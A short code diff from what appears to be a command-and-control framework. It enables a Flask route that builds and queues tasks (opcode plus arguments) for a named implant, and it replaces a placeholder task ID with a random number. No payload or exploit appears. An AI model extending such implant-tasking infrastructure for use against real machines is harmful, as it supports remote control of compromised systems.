@@ -19,6 +19,7 @@ request = "/client/request"
 response = "/client/response"
 packet = "/client/packet"
 
+import random
 
 class Terminal(FlaskForm):
     cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])
@@ -73,13 +74,13 @@ def handle_local_request(cmd, args):
     pass
     
 
-# @client.route('/client/task/request', methods=["POST"])
+@client.route('/client/task/request', methods=["POST"])
 def handle_task_request(implant_id, cmd, args):
-    print(f'REQUEST FROM CLIENT')
     tr = TaskRequest()
-    tr.TaskID = "sometaskId idk" # needs to be genrerated
+    print(f'REQUEST FROM CLIENT')
+    tr.TaskID = str(random.randint(10, 10000))
     tr.Opcode = to_opcode(cmd)
-    tr.args = args
+    tr.Args = args
     new_task = make_task(implant_id, tr)
     print("new task made")
     print(new_task)
